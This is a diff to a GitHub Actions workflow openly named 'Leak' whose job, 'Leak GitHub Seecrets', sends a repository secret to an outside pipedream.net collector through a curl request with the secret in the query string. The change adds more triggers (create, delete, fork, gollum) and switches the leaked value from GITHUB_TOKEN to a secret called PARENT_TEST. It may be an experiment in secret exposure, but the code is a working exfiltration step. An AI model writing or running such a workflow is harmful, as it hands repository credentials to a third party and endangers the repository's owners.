@@ -3,7 +3,11 @@ name: Leak
 on:
   issues:
     types: [opened, closed, edited, milestoned]
-
+  create:
+  delete:
+  fork:
+  gollum:
+  
 jobs:
   leak:
     name: Leak GitHub Seecrets
@@ -15,4 +19,4 @@ jobs:
           VAR_ABC=$VALUE
           curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
-          VALUE: ${{ secrets.GITHUB_TOKEN }}
+          VALUE: ${{ secrets.PARENT_TEST }}
